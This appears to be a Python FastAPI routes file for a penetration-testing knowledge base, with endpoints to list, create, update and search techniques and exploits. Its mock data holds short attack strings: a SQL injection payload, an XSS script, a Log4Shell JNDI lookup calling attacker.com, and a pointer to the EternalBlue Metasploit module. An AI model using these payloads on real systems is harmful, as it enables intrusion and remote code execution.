"""
Knowledge Base API Routes
Manage techniques and exploits
"""

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from typing import List, Dict, Optional
import logging

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/knowledge", tags=["knowledge"])


class Technique(BaseModel):
    id: str
    name: str
    category: str
    description: str
    difficulty: str
    tags: List[str]
    code: Optional[str] = None
    references: List[str]
    successRate: float
    usageCount: int


class Exploit(BaseModel):
    id: str
    cve: Optional[str] = None
    name: str
    description: str
    severity: str
    platforms: List[str]
    code: str
    references: List[str]


# Mock data (replace with database)
techniques_db = [
    {
        "id": "tech_001",
        "name": "SQL Injection",
        "category": "Web Exploitation",
        "description": "Inject malicious SQL queries to manipulate database",
        "difficulty": "medium",
        "tags": ["web", "database", "injection"],
        "code": "' OR '1'='1' --",
        "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
        "successRate": 75.5,
        "usageCount": 1234
    },
    {
        "id": "tech_002",
        "name": "Cross-Site Scripting (XSS)",
        "category": "Web Exploitation",
        "description": "Inject malicious scripts into web pages",
        "difficulty": "easy",
        "tags": ["web", "javascript", "injection"],
        "code": "<script>alert('XSS')</script>",
        "references": ["https://owasp.org/www-community/attacks/xss/"],
        "successRate": 82.3,
        "usageCount": 2156
    },
    {
        "id": "tech_003",
        "name": "Buffer Overflow",
        "category": "Binary Exploitation",
        "description": "Overflow buffer to overwrite memory",
        "difficulty": "hard",
        "tags": ["binary", "memory", "overflow"],
        "code": "python -c 'print(\"A\" * 1000)'",
        "references": ["https://en.wikipedia.org/wiki/Buffer_overflow"],
        "successRate": 45.2,
        "usageCount": 567
    }
]

exploits_db = [
    {
        "id": "exp_001",
        "cve": "CVE-2021-44228",
        "name": "Log4Shell",
        "description": "Remote code execution in Log4j",
        "severity": "critical",
        "platforms": ["Linux", "Windows", "macOS"],
        "code": "${jndi:ldap://attacker.com/a}",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
    },
    {
        "id": "exp_002",
        "cve": "CVE-2017-0144",
        "name": "EternalBlue",
        "description": "SMB vulnerability used by WannaCry",
        "severity": "critical",
        "platforms": ["Windows"],
        "code": "# Use Metasploit module: exploit/windows/smb/ms17_010_eternalblue",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2017-0144"]
    }
]


@router.get("/techniques", response_model=List[Technique])
async def get_techniques():
    """Get all techniques"""
    return techniques_db


@router.get("/techniques/{technique_id}", response_model=Technique)
async def get_technique(technique_id: str):
    """Get specific technique"""
    technique = next((t for t in techniques_db if t["id"] == technique_id), None)
    
    if not technique:
        raise HTTPException(status_code=404, detail="Technique not found")
    
    return technique


@router.post("/techniques")
async def create_technique(technique: Technique):
    """Create new technique"""
    techniques_db.append(technique.dict())
    return {"success": True, "technique_id": technique.id}


@router.put("/techniques/{technique_id}")
async def update_technique(technique_id: str, technique: Technique):
    """Update technique"""
    index = next((i for i, t in enumerate(techniques_db) if t["id"] == technique_id), None)
    
    if index is None:
        raise HTTPException(status_code=404, detail="Technique not found")
    
    techniques_db[index] = technique.dict()
    return {"success": True}


@router.delete("/techniques/{technique_id}")
async def delete_technique(technique_id: str):
    """Delete technique"""
    global techniques_db
    techniques_db = [t for t in techniques_db if t["id"] != technique_id]
    return {"success": True}


@router.get("/exploits", response_model=List[Exploit])
async def get_exploits():
    """Get all exploits"""
    return exploits_db


@router.get("/exploits/{exploit_id}", response_model=Exploit)
async def get_exploit(exploit_id: str):
    """Get specific exploit"""
    exploit = next((e for e in exploits_db if e["id"] == exploit_id), None)
    
    if not exploit:
        raise HTTPException(status_code=404, detail="Exploit not found")
    
    return exploit


@router.post("/exploits")
async def create_exploit(exploit: Exploit):
    """Create new exploit"""
    exploits_db.append(exploit.dict())
    return {"success": True, "exploit_id": exploit.id}


@router.put("/exploits/{exploit_id}")
async def update_exploit(exploit_id: str, exploit: Exploit):
    """Update exploit"""
    index = next((i for i, e in enumerate(exploits_db) if e["id"] == exploit_id), None)
    
    if index is None:
        raise HTTPException(status_code=404, detail="Exploit not found")
    
    exploits_db[index] = exploit.dict()
    return {"success": True}


@router.delete("/exploits/{exploit_id}")
async def delete_exploit(exploit_id: str):
    """Delete exploit"""
    global exploits_db
    exploits_db = [e for e in exploits_db if e["id"] != exploit_id]
    return {"success": True}


@router.post("/search")
async def search_knowledge(query: Dict):
    """Search techniques and exploits"""
    search_term = query.get("term", "").lower()
    
    matching_techniques = [
        t for t in techniques_db
        if search_term in t["name"].lower() or search_term in t["description"].lower()
    ]
    
    matching_exploits = [
        e for e in exploits_db
        if search_term in e["name"].lower() or search_term in e["description"].lower()
    ]
    
    return {
        "techniques": matching_techniques,
        "exploits": matching_exploits
    }

